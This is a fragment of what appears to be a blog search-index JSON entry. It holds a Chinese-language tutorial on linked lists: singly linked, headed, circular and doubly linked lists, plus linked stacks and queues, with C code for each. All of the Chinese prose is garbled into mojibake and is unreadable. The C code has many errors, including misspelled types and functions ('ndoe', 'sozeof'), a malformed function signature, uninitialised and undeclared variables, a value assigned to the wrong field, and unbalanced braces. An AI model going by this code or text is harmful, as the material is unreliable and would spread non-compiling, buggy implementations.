0;&#125;","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"é“¾å¼å­˜å‚¨","slug":"é“¾å¼å­˜å‚¨","permalink":"https://xizhi-future.github.io/tags/%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/"}],"author":"xizhi-future"},{"title":"çº¿æ€§è¡¨çš„é“¾å¼å­˜å‚¨","slug":"çº¿æ€§è¡¨çš„é“¾å¼å­˜å‚¨","date":"2021-10-05T11:49:33.000Z","updated":"2021-10-07T09:32:38.385Z","comments":true,"path":"2021/10/05/çº¿æ€§è¡¨çš„é“¾å¼å­˜å‚¨/","link":"","permalink":"https://xizhi-future.github.io/2021/10/05/%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/","excerpt":"","text":"[TOC] çº¿æ€§è¡¨çš„é“¾å¼å­˜å‚¨çº¿æ€§è¡¨çš„å­˜å‚¨æ–¹å¼ï¼šé¡ºåºå­˜å‚¨ ã€é“¾å¼å­˜å‚¨ å•é“¾è¡¨ å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ å¾ªç¯å•é“¾è¡¨ åŒé“¾è¡¨ ç‰¹æ®Šçš„çº¿æ€§è¡¨â€“æ ˆå’Œé˜Ÿåˆ— çš„ é“¾å¼å­˜å‚¨å®ç° é“¾å¼å­˜å‚¨ï¼šæŒ‡é’ˆ ä½“ç°ç»“ç‚¹ä¹‹é—´çš„é€»è¾‘å…³ç³» info next å•é“¾è¡¨ç»“ç‚¹åŒ…å« ä¸¤ä¸ªåŸŸï¼šinfoåŸŸ next æŒ‡é’ˆåŸŸ å¿…é¡»å«æœ‰ä¸€ä¸ªé¦–æŒ‡é’ˆ æŒ‡å‘å•é“¾è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªç»“ç‚¹ head å•é“¾è¡¨çš„åˆ›å»ºå‰æ’æ³•ï¼š 12345678910111213141516//åˆ›å»ºå•é“¾è¡¨ å‰æ’æ³•node *creat_first(void)&#123; node *head = NULL; node *s; int x; printf(&quot;è¯·è¾“å…¥å„ä¸ªç»“ç‚¹çš„å€¼ï¼š\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x != FLAG)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; s-&gt;next = head; head = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125; å°¾æ’æ³•ï¼š 1234567891011121314151617181920212223//åæ’æ³• åˆ›å»ºå•é“¾è¡¨node *creat_behind(void)&#123; node *head = NULL; node *r = NULL; node *s; int x; printf(&quot;è¯·è¾“å‡ºå„ä¸ªç»“ç‚¹çš„å€¼ï¼š\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x != FLAG)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; if(!head) head = s; else r-&gt;next = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; if(r != NULL)&#123; r-&gt;next = NULL; &#125; return head;&#125; å•é“¾è¡¨çš„æ“ä½œ12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#include&lt;stdio.h&gt;typedef int datatype;typedef struct link_node&#123; datatype info; struct link_node *next;&#125;node;//å»ºç«‹ä¸€ä¸ªç©ºçš„é“¾è¡¨node *init()&#123; return NULL;&#125;//è¾“å‡ºvoid print(node *head)&#123; node *p; p = head; if(!p) printf(&quot;å•é“¾è¡¨æ˜¯ç©ºçš„ï¼&quot;); else &#123; printf(&quot;\\nå•é“¾è¡¨å„ä¸ªç»“ç‚¹çš„å€¼æ˜¯ï¼š\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125; &#125;&#125;//æŸ¥æ‰¾å€¼æ˜¯ x çš„ç»“ç‚¹node *find_x(node *head,datatype x)&#123; node *p; p = head; while(p &amp;&amp; p-&gt;info != x) p = p-&gt;next; return p;&#125;//æŸ¥æ‰¾ ç¬¬ i ä¸ªç»“ç‚¹node *find_i(node *head,int i)&#123; int j = 1; node *p = head; if(i &lt; 1) &#123;printf(&quot;\\nError!&quot;);return NULL;&#125; while(p &amp;&amp; i!=j) &#123;p = p-&gt;next;j++;&#125; return p;&#125;//æ’å…¥ å€¼ä¸º x çš„ç»“ç‚¹ä½œä¸ºå•é“¾è¡¨çš„ç¬¬ä¸€ä¸ªç»“ç‚¹ node *insert_begin(node *head,datatype x)&#123; node *p; p = (node*)malloc(sizeof(node)); p-&gt;info = x; p-&gt;next = head; head = p; //p ç°åœ¨æ˜¯ç¬¬ä¸€ä¸ªç»“ç‚¹ï¼Œå¤´ head æ¢æˆ p return head;&#125;//åœ¨å•é“¾è¡¨ ç¬¬ i ä¸ªç»“ç‚¹ä¹‹åæ’å…¥ä¸€ä¸ªå€¼ä¸º x çš„ç»“ç‚¹node *insert_medium(node *head,datatype x,int i)&#123; node *p,*q; q = find_i(head,i);//æŸ¥æ‰¾ç¬¬ i ä¸ªç»“ç‚¹ if(!q) &#123;printf(&quot;æ‰¾ä¸åˆ°ç¬¬ i ä¸ªç»“ç‚¹ï¼Œä¸èƒ½è¿›è¡Œæ’å…¥ï¼&quot;);exit(1);&#125; p = (node*)malloc(sizeof(node)); p-&gt;info = x; p-&gt;next = q-&gt;next; q-&gt;next = p; return head;&#125;//åœ¨å•é“¾è¡¨æœ€åä½ç½®æ’å…¥ç»“ç‚¹ xnode *insert_last(node *head,datatype x)&#123; node *p = head; node *q; q = (node*)malloc(sizeof(node)); q-&gt;info = x; while(p-&gt;next)&#123; //æ‰¾åˆ°æœ€åä¸€ä¸ªç»“ç‚¹çš„ä½ç½®ï¼Œæœ€åä¸€ä¸ªç»“ç‚¹çš„ next æ˜¯ NULL p = p-&gt;next; &#125; p-&gt;next = q; q-&gt;next = NULL; return head;&#125;//åˆ é™¤å•é“¾è¡¨ ç»“ç‚¹node *delete_begin(node *head,datatype x)&#123; node *pre = NULL,*p; if(!head)&#123; printf(&quot;å•é“¾è¡¨æ˜¯ç©ºçš„ï¼&quot;);exit(1); return head; &#125; p = head; while(p &amp;&amp; p-&gt;info != x)&#123; //å¦‚æœåˆ é™¤çš„æ˜¯ä¸­é—´çš„ ç”¨ pre æŒ‡å‘ p åŸæœ¬çš„ä½ç½® pre = p; p = p-&gt;next; &#125; if(!pre &amp;&amp; p-&gt;info == x)&#123; //éœ€è¦åˆ é™¤çš„æ˜¯ ç¬¬ä¸€ä¸ª ç»“ç‚¹ head = head-&gt;next; &#125;else&#123; pre-&gt;next = p-&gt;next; //éœ€è¦åˆ é™¤çš„æ˜¯ ä¸­é—´çš„ ç»“ç‚¹ &#125; free(p); return head;&#125; é“¾å¼å­˜å‚¨ çš„æ’å…¥ä¸åˆ é™¤ æ¯” é¡ºåºè¡¨æ–¹ä¾¿ï¼Œä½†ä¸èƒ½éšæœºå»è®¿é—® æŸä¸ªç»“ç‚¹ æ’å…¥åˆ¤æ»¡ï¼Œåˆ é™¤åˆ¤ç©ºï¼ï¼ï¼ï¼ï¼ï¼ï¼1 å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨åˆ›å»º1234567891011121314151617//åæ’æ³• åˆ›å»º å¸¦å¤´ç»“ç‚¹çš„ å•é“¾è¡¨node *creat_behind()&#123; node *head,*s,*r; datatype x; head = r = (node*)malloc(sizeof(node)); printf(&quot;è¯·è¾“å…¥å•é“¾è¡¨å†…å®¹ï¼šï¼ˆä»¥ 0 ç»“å°¾ï¼‰\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; r-&gt;next = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; r-&gt;next = NULL; return head;&#125; å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨æ“ä½œ1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465//åˆå§‹åŒ–node *init()&#123; node *head; head = (node*)malloc(sizeof(node)); head-&gt;next = NULL; return head;&#125;//æ‰“å°è¾“å‡º å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨void print(node *head)&#123; node *p; p = head-&gt;next; if(!p)&#123; printf(&quot;å•é“¾è¡¨æ˜¯ç©ºçš„ï¼\\n&quot;); &#125;else&#123; printf(&quot;å•é“¾è¡¨ä¸­å„ä¸ªç»“ç‚¹çš„å€¼æ˜¯ï¼š\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125; &#125; printf(&quot;\\n&quot;);&#125;//æŸ¥æ‰¾ç¬¬ i ä¸ªç»“ç‚¹node *find_i(node *head,int i)&#123; int j = 0; node *p = head; if(i &lt; 0) &#123;printf(&quot;ä¸å­˜åœ¨ç¬¬ %d ä¸ªç»“ç‚¹ï¼\\n&quot;,i); return NULL;&#125; else if(i==0) //åˆšå¥½ä¸ºå¤´ç»“ç‚¹ ç”±äºæ˜¯å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ï¼Œåˆ™ä¸º NULL return p; while(p &amp;&amp; i!=j)&#123; p = p-&gt;next; j++; &#125; return p;&#125;//æ’å…¥æ“ä½œ åœ¨ ç¬¬ i ä¸ª ç»“ç‚¹ä¹‹åæ’å…¥ xnode *insert(node *head,datatype x,int i)&#123; node *p,*q; q = find_i(head,i); if(!q) &#123;printf(&quot;ä¸å­˜åœ¨ç¬¬ %d ä¸ªç»“ç‚¹ï¼\\n&quot;,i); return head;&#125; p = (node*)malloc(sizeof(node)); p-&gt;info = x; p-&gt;next = q-&gt;next; q-&gt;next = p; return head;&#125;//åˆ é™¤æ“ä½œnode *delete(node *head,datatype x)&#123; ndoe *pre = head,*q; q = head-&gt;next; //ç”±äºæ˜¯å¸¦å¤´ç»“ç‚¹ while(q &amp;&amp; q-&gt;info != x)&#123; pre = q; //ä½¿ pre å§‹ç»ˆæŒ‡å‘ p çš„å‰é©± q = q-&gt;next; &#125; if(q)&#123; pre-&gt;next = q-&gt;next; //åˆ é™¤ free(q); //é‡Šæ”¾ç©ºé—´ &#125; return head;&#125; å¾ªç¯å•é“¾è¡¨å¦‚æœä»…ä»…æ˜¯å•é“¾è¡¨çš„è¯ï¼Œå®ƒåªèƒ½ä»é¦–æŒ‡é’ˆå¼€å§‹ï¼Œä¾æ¬¡å‘åè®¿é—®ï¼Œè€Œä¸èƒ½è®¿é—®åˆ°å®ƒå‰é¢çš„ç»“ç‚¹ï¼Œå¦‚æœæƒ³è¦è®¿é—®åˆ°ä»»æ„çš„ç»“ç‚¹çš„è¯â€”â€”&gt;å¾ªç¯å•é“¾è¡¨ã€‚ åšæ³•ï¼šè®¾ç½®è¡¨æœ€åä¸€ä¸ªç»“ç‚¹çš„æŒ‡é’ˆåŸŸæŒ‡å‘è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªç»“ç‚¹ã€‚ å‡è®¾æœ€åä¸€ä¸ªç»“ç‚¹çš„ä½ç½®æ˜¯ p ï¼Œåˆ™ p-&gt;next = head; å¾ªç¯å•é“¾è¡¨çš„æ“ä½œ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125//åˆå§‹åŒ–node *init()&#123; return NULL;&#125;//è·å¾— å¾ªç¯å•é“¾è¡¨ æœ€åä¸€ä¸ªç»“ç‚¹çš„ å­˜å‚¨åœ°å€node *rear(node *head)&#123; node *p; if(!head) p = NULL; //å¾ªç¯å•é“¾è¡¨ ä¸ºç©º else&#123; p = head; while(p-&gt;next != head) p = p-&gt;next; &#125; return p;&#125;//æ‰“å°è¾“å‡ºvoid print(node *head)&#123; node *p; if(!head) printf(&quot;å¾ªç¯å•é“¾è¡¨æ˜¯ç©ºçš„ï¼\\n&quot;); else&#123; printf(&quot;å¾ªç¯å•é“¾è¡¨ä¸­å„ä¸ªç»“ç‚¹çš„å€¼æ˜¯ï¼š\\n&quot;); printf(&quot;%5d&quot;,p-&gt;info); //è¾“å‡ºéç©ºè¡¨ä¸­çš„ ç¬¬ä¸€ä¸ª ç»“ç‚¹çš„å€¼ p = head-&gt;next; //ä½¿ p æŒ‡å‘ç¬¬ä¸€ä¸ªç»“ç‚¹çš„ä¸‹ä¸€ä¸ªç»“ç‚¹ while(p != head)&#123; //è¾“å‡ºä¸­é—´çš„ç»“ç‚¹å€¼ï¼Œç›´åˆ°å›åˆ°ç¬¬ä¸€ä¸ªç»“ç‚¹ printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125; &#125;&#125;//æŸ¥æ‰¾ å€¼ æ˜¯ x çš„ç»“ç‚¹node *find_x(ndoe *head,datatype x)&#123; node *p; if(!head) &#123;printf(&quot;å¾ªç¯å•é“¾è¡¨æ˜¯ ç©ºçš„ ï¼\\n&quot;); return NULL;&#125; q = head; while(q-&gt;next != head &amp;&amp; q-&gt;info != x)&#123; q = q-&gt;next; &#125; if(q-&gt;info == x) return q; else return NULL;&#125;//æ’å…¥æ“ä½œnode *insert(node *head,datatype x,int i)&#123; node *p,*q,*myrear; int j; p = (node*)malloc(sizeof(node)); p-&gt;info = x; if(i&lt;0)&#123; printf(&quot;æ‰¾ä¸åˆ°æŒ‡å®šä½ç½®ï¼\\n&quot;);&#125; free(p); return head; &#125; if(i == 0 &amp;&amp; !head)&#123; //æ’å…¥ä¹‹å‰å¾ªç¯å•é“¾è¡¨æ˜¯ç©ºçš„ï¼Œåˆ™æ’å…¥åæŒ‡é’ˆåº”æŒ‡å‘è‡ªå·± p-&gt;next = p; head = p; return head; &#125; if(i == 0 &amp;&amp; head)&#123; //åœ¨éç©ºçš„ å¾ªç¯å•é“¾è¡¨ä¸­ æ’å…¥ åˆ° æœ€å‰é¢ myrear = rear(head); //å¯»æ‰¾ æœ€åä¸€ä¸ªç»“ç‚¹ p-&gt;next = head; //å°† p ä½œä¸º æœ€åä¸€ä¸ªç»“ç‚¹ myrear-&gt;next = p; return head; &#125; if(i&gt;0 &amp;&amp; !head)&#123; printf(&quot;æ— æ³•æ‰¾åˆ°æŒ‡å®šä½ç½®æ’å…¥!\\n&quot;); free(p); return head; &#125; if(i&gt;0 &amp;&amp; head)&#123; //åœ¨éç©ºçš„ å¾ªç¯å•é“¾è¡¨ä¸­ æ’å…¥ ä½ç½®ä»»æ„ q = head; j = 1; while(i != j &amp;&amp; q-&gt;next != head)&#123; q = q-&gt;next; j++; &#125; if(i != j)&#123; printf(&quot;ä¸å­˜åœ¨ç¬¬ %d ä¸ªç»“ç‚¹ï¼Œæ— æ³•æ’å…¥ï¼&quot;,i); return head; &#125;else&#123; p-&gt;next = q-&gt;next; q-&gt;next = p; return head; &#125; &#125;&#125;//åˆ é™¤æ“ä½œ åˆ é™¤å€¼æ˜¯ x çš„ç»“ç‚¹node *delete(node *head,datatype x)&#123; node *pre = NULL,*q; if(!head)&#123; printf(&quot;å¾ªç¯å•é“¾è¡¨æ˜¯ç©ºçš„ï¼\\n&quot;); return head; &#125; q = head; while(q-&gt;next != head &amp;&amp; q-&gt;info != x)&#123; pre = q; q = q-&gt;next; &#125; if(q-&gt;info != x)&#123; printf(&quot;æ²¡æœ‰æ‰¾åˆ°æŒ‡å®šä½ç½®ï¼\\n&quot;); &#125;else&#123; if(q != head)&#123; pre-&gt;next = q-&gt;next; free(q); &#125;else&#123; if(head-&gt;next == head) &#123;free(q); head = NULL;&#125; else&#123; pre = head-&gt;next; while(pre-&gt;next != q) pre = pre-&gt;next; head = head-&gt;next; pre-&gt;next = head; free(q); &#125; &#125; &#125; return head;&#125; é¢˜ç›®ï¼šå°†ä¸€ä¸ª åŒé“¾è¡¨ æ”¹æˆä¸€ä¸ª å¾ªç¯ åŒé“¾è¡¨1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef int datatype;typedef struct dlink_node&#123; datatype info; struct dlink_node *llink,*rlink;&#125;dnode;//å°¾æ’æ³• åˆ›å»ºå¸¦å¤´ç»“ç‚¹çš„åŒé“¾è¡¨dnode *creat_behind(void)&#123; dnode *head,*r,*s; //æ³¨æ„ï¼šåŒæ—¶å®šä¹‰å¤šä¸ªæŒ‡é’ˆ datatype x; head = r = (dnode*)malloc(sizeof(dnode));//å»ºç«‹åŒé“¾è¡¨çš„å¤´ç»“ç‚¹ head-&gt;llink = head-&gt;rlink = NULL; printf(&quot;è¯·è¾“å‡ºåŒé“¾è¡¨çš„å†…å®¹ï¼š(ä»¥ 0 ç»“æŸ)\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x)&#123; s = (dnode*)malloc(sizeof(dnode)); s-&gt;info = x; s-&gt;rlink = r-&gt;rlink; //å°†æ–°çš„ç»“ç‚¹ s æ’å…¥åˆ°åŒé“¾è¡¨çš„æœ«å°¾ s-&gt;llink = r; r-&gt;rlink = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125;//æ‰“å°è¾“å‡ºvoid print(dnode *head)&#123; dnode *p; p = head-&gt;rlink; //ç”±äºæ˜¯å¸¦å¤´ç»“ç‚¹çš„ æ‰€ä»¥ æŒ‡å‘ head çš„ ä¸‹ä¸€ä¸ªä½ç½® while(p != head)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;rlink; &#125;&#125;//å°†ä¸€ä¸ª åŒé“¾è¡¨ æ”¹æˆä¸€ä¸ª å¾ªç¯ åŒé“¾è¡¨void change(dnode *head)&#123; dnode *r; r = head; while(r-&gt;rlink) r = r-&gt;rlink; head-&gt;llink = r; r-&gt;rlink = head;&#125;int main()&#123; dnode *pt; pt = creat_behind(); change(pt); printf(&quot;å¾ªç¯åŒé“¾è¡¨çš„å†…å®¹æ˜¯ï¼š\\n&quot;); print(pt); printf(&quot;\\n&quot;); return 0;&#125; åŒé“¾è¡¨ä¸ºäº†ä¾¿äºçŸ¥é“ é“¾è¡¨ä¸­ä»»æ„ä¸€ä¸ªç»“ç‚¹çš„ å‰é©±ç»“ç‚¹ å’Œ åç»§ç»“ç‚¹ï¼Œæˆ‘ä»¬å†è®¾ä¸€ä¸ªæŒ‡é’ˆåŸŸæ¥æŒ‡å‘è¯¥èŠ‚ç‚¹çš„å‰é©±ç»“ç‚¹ï¼Œä»è€Œå½¢æˆäº†åŒé“¾è¡¨ã€‚ åŒé“¾è¡¨ä¸­ï¼Œå…¶ç»“ç‚¹ å«æœ‰ ä¸‰ä¸ªåŸŸï¼šinfo llink rlink åŒé“¾è¡¨çš„åˆ›å»º1234567891011121314151617181920//å°¾æ’æ³• åˆ›å»ºå¸¦å¤´ç»“ç‚¹çš„åŒé“¾è¡¨dnode *creat_behind(void)&#123; dnode *head,*r,*s; //æ³¨æ„ï¼šåŒæ—¶å®šä¹‰å¤šä¸ªæŒ‡é’ˆ datatype x; head = r = (dnode*)malloc(sizeof(dnode));//å»ºç«‹åŒé“¾è¡¨çš„å¤´ç»“ç‚¹ head-&gt;llink = head-&gt;rlink = NULL; printf(&quot;è¯·è¾“å‡ºåŒé“¾è¡¨çš„å†…å®¹ï¼š(ä»¥ 0 ç»“æŸ)\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x)&#123; s = (dnode*)malloc(sizeof(dnode)); s-&gt;info = x; s-&gt;rlink = r-&gt;rlink; //å°†æ–°çš„ç»“ç‚¹ s æ’å…¥åˆ°åŒé“¾è¡¨çš„æœ«å°¾ s-&gt;llink = r; r-&gt;rlink = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125; åŒé“¾è¡¨çš„æ“ä½œ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#include&lt;stdio.h&gt;typedef int datatype;typedef struct dlink_node&#123; datatype info; struct dlink_node *llink,*rlink;&#125;dnode;//åˆå§‹åŒ–dnode *init()&#123; return NULL;&#125;//æ‰“å°è¾“å‡ºvoid dnode*(dnode *head)&#123; dnode *p = head; if(!p) &#123;printf(&quot;åŒé“¾è¡¨æ˜¯ç©ºçš„ï¼\\n&quot;);&#125; else&#123; printf(&quot;åŒé“¾è¡¨ä¸­å„ä¸ªç»“ç‚¹çš„å€¼æ˜¯ï¼š\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;rlink; &#125; &#125;&#125;//æŸ¥æ‰¾ ç¬¬ i ä¸ªç»“ç‚¹dnode *find_i(dnode *head,int i)&#123; dnode *p = head; int j = 1; if(i &lt; 1) &#123;printf(&quot;ç¬¬%dä¸ªç»“ç‚¹ä½ç½®ä¸å­˜åœ¨ï¼\\n,i&quot;);return NULL;&#125; while(p &amp;&amp; i != j)&#123; p = p-&gt;rlink; j++; &#125; if(!p) &#123;printf(&quot;ç¬¬%dä¸ªç»“ç‚¹ä½ç½®ä¸å­˜åœ¨ï¼\\n,i&quot;);return NULL;&#125; //ä¸ºä»€ä¹ˆï¼Ÿï¼Ÿ return p;&#125;//åœ¨ ç¬¬ i ä¸ªç»“ç‚¹å æ’å…¥ å€¼ä¸º x çš„ç»“ç‚¹dnode *insert(dnode *head,datatype x,int i)&#123; dnode *p,*q; p = (dnode*)malloc(sozeof(dnode));//ä¸ºæ–°çš„ç»“ç‚¹åˆ†é…ç©ºé—´ p-&gt;next = x; //è®¾ç½®æ–°çš„ç»“ç‚¹å€¼ if(i == 0)&#123; //æ’å…¥åˆ°ç¬¬ä¸€ä¸ªç»“ç‚¹ p-&gt;llink = NULL; p-&gt;rlink = head; if(!head)&#123; head = p; &#125;else&#123; head-&gt;llink = p; head = p; &#125; return head; &#125; q = find_i(head,i); if(!q) &#123;printf(&quot;ç¬¬ %d ä¸ªç»“ç‚¹ä¸å­˜åœ¨ï¼Œæ— æ³•æ’å…¥ï¼\\n&quot;); return head;&#125; if(q-&gt;rlink == NULL)&#123; //æ’åˆ°æœ€åä¸€ä¸ªç»“ç‚¹ p-&gt;rlink = q-&gt;rlink; p-&gt;llink = q; q-&gt;rlink = p; &#125;else&#123; //ä¸­é—´æ’å…¥ p-&gt;rlink = q-&gt;rlink; p-&gt;llink = q; q-&gt;rlink-&gt;llink = p; q-&gt;rlink = p; &#125; return head;&#125;//åˆ é™¤ å€¼ä¸º x çš„ç»“ç‚¹dnode *delete(dnode *head,datatype x)&#123; dnode *q; if(!head)&#123; printf(&quot;åŒé“¾è¡¨ä¸ºç©ºï¼Œæ— æ³•åˆ é™¤ï¼\\n&quot;); return head; &#125; q = head; while(q &amp;&amp; q-&gt;info != x) //å¯»æ‰¾ å€¼ä¸º x çš„ç»“ç‚¹çš„ä½ç½® q = q-&gt;rlink; if(!q)&#123; printf(&quot;æ‰¾ä¸åˆ°ç»“ç‚¹çš„ä½ç½®ï¼\\n&quot;); &#125; if(q == head &amp;&amp; head-&gt;rlink)&#123; //éœ€è¦åˆ é™¤çš„æ˜¯ç¬¬ä¸€ä¸ªç»“ç‚¹ï¼Œè€Œä¸”è¡¨ä¸­ ä¸åªæœ‰è¿™ä¸€ä¸ªç»“ç‚¹ head = head-&gt;rlink; head-&gt;llink = NULL; free(q); return head; &#125; if(q == head &amp;&amp; !head-&gt;rlink)&#123; //éœ€è¦åˆ é™¤çš„æ˜¯ç¬¬ä¸€ä¸ªç»“ç‚¹ï¼Œè€Œä¸”è¡¨ä¸­ ä»…ä»…åªæœ‰è¿™ä¸€ä¸ªç»“ç‚¹ free(q); return NULL; //ç›´æ¥å°†åŒé“¾è¡¨ ç½®ç©ºï¼Œå³åˆå§‹åŒ–å³å¯ &#125;else&#123; if(!q-&gt;rlink)&#123; //è¢«åˆ é™¤çš„æ˜¯ é“¾è¡¨ æœ€åä¸€ä¸ªç»“ç‚¹ q-&gt;llink-&gt;rlink = NULL; free(q); return head; &#125;else&#123; //éœ€è¦åˆ é™¤çš„æ˜¯ä¸­é—´çš„ç»“ç‚¹ q-&gt;llink-&gt;rlink = q-&gt;rlink; q-&gt;rlink-&gt;llink = q-&gt;llink; free(q); return head; &#125; &#125;&#125; é“¾å¼æ ˆæ ˆçš„é“¾å¼å­˜å‚¨ï¼Œç‰¹æ®Šçš„å•é“¾è¡¨ æ’å…¥ ä¸ åˆ é™¤ åœ¨ å•é“¾è¡¨çš„ åŒä¸€ç«¯è¿›è¡Œ æ ˆé¡¶æŒ‡é’ˆ topæŒ‡å‘ç¬¬ä¸€ä¸ªç»“ç‚¹çš„ä½ç½® 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;stdio.h&gt;typedef int datatype;typedef struct link_stack&#123; datatype info; struct link_stack *top,*next;&#125;ndoe;//åˆå§‹åŒ–ï¼šå»ºç«‹ä¸€ä¸ªç©ºçš„ æ ˆnode *init()&#123; return NULL;&#125;//åˆ¤æ–­ æ˜¯å¦ä¸ºç©ºint empty(node *top)&#123; return (top?0:1);&#125;//å–å¾—é“¾å¼æ ˆ æ ˆé¡¶çš„ç»“ç‚¹å€¼datatype read_top(node *top)&#123; if(!top) &#123;printf(&quot;é“¾å¼æ ˆæ˜¯ç©ºçš„ï¼\\n&quot;); exit(1);&#125; return (top-&gt;info);&#125;//æ‰“å°è¾“å‡ºvoid print(node *top)&#123; node *p; p = top; printf(&quot;\\n&quot;); if(!p) printf(&quot;é“¾å¼æ ˆæ˜¯ç©ºçš„ï¼\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125;&#125;//è¿›æ ˆï¼šæ’å…¥å€¼ä¸º x çš„ç»“ç‚¹ ä¸º topnode *push(node *top,datatype x)&#123; node *p; p = (node*)malloc(sizeof(ndoe)); p-&gt;info = x; p-&gt;next = top; top = p; return top;&#125;//å‡ºæ ˆï¼šåˆ é™¤é“¾å¼æ ˆæ ˆé¡¶ç»“ç‚¹ topnode *delete(node *top)&#123; node *q; if(!top) &#123;printf(&quot;é“¾å¼æ ˆæ˜¯ç©ºçš„ï¼\\n&quot;);return NULL;&#125; q = top; top = top-&gt;next; free(q); return top;&#125; é“¾å¼é˜Ÿåˆ—é˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨ï¼Œç‰¹æ®Šçš„å•é“¾è¡¨ æ’å…¥ ä¸ åˆ é™¤ åˆ†åˆ«åœ¨å•é“¾è¡¨çš„ä¸¤ç«¯è¿›è¡Œ é˜Ÿé¦– front é˜Ÿå°¾ rear æŒ‡å‘æœ€åä¸€ä¸ªç»“ç‚¹ï¼Œå³æœ€åä¸€ä¸ªç»“ç‚¹çš„ next æ˜¯ NULL 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include&lt;stdio.h&gt;typedef int datatype;typedef struct link_node&#123; datatype info; struct link_node *next; //ç»“ç‚¹å®šä¹‰&#125;node;typedef struct&#123; node *front,*rear; //é˜Ÿé¦– é˜Ÿå°¾æŒ‡é’ˆ å®šä¹‰&#125;queue;//åˆå§‹åŒ–ï¼šå»ºç«‹ä¸€ä¸ª ç©ºçš„é“¾å¼é˜Ÿåˆ—queue *init()&#123; queue *qu; qu = (queue*)malloc(sizeof(queue)); qu-&gt;front = NULL; qu-&gt;rear = NULL; return qu;&#125;//åˆ¤æ–­ é“¾å¼é˜Ÿåˆ— æ˜¯å¦ä¸ºç©ºint empty(queue qu)&#123; return (qu.front ? 0:1);&#125;//æ‰“å°è¾“å‡ºvoid print(queue *qu)&#123; node *p; printf(&quot;\\n&quot;); p = qu-&gt;front; if(!p) printf(&quot;é“¾å¼é˜Ÿåˆ—çš„ç©ºçš„ï¼\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125;&#125;//å–å¾—é“¾å¼é˜Ÿåˆ—é˜Ÿé¦–ç»“ç‚¹å€¼datatype read_front(queue qu)&#123; if(!p.front)&#123; printf(&quot;é“¾å¼é˜Ÿåˆ—æ˜¯ç©ºçš„ï¼\\n&quot;); exit(1); &#125; return (qu.front-&gt;info);&#125;//æ’å…¥æ“ä½œ é˜Ÿå°¾æ’å…¥queue *insert(queue *qu,datatype x)&#123; node *p; p = (node*)malloc(sizeof(node)); p-&gt;info = x; p-&gt;next = NULL; if(qu-&gt;front == NULL) qu-&gt;front = qu-&gt;rear = p; //å½“é˜Ÿåˆ—æœ¬èº«æ˜¯ ç©º æ—¶ else&#123; qu-&gt;rear-&gt;next = p; //é˜Ÿå°¾æ’å…¥ qu-&gt;rear = p; &#125; return qu;&#125;//åˆ é™¤æ“ä½œï¼šé˜Ÿé¦–åˆ é™¤queue *delete(queue *qu)&#123; node *q; if(!qu-&gt;front) &#123;printf(&quot;é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— æ³•æ’å…¥ï¼\\n&quot;); return qu;&#125; q = qu-&gt;front; qu-&gt;front = q-&gt;next; free(q); if(qu-&gt;front == NULL) qu-&gt;rear = NULL; return qu;&#125;","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"é“¾å¼å­˜å‚¨","slug":"é“¾å¼å­˜å‚¨","permalink":"https://xizhi-future.github.io/tags/%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/"}],"author":"xizhi-future"},{"title":"é¡ºåºè¡¨ã€æ ˆã€é˜Ÿåˆ—","slug":"é¡ºåºè¡¨ã€æ 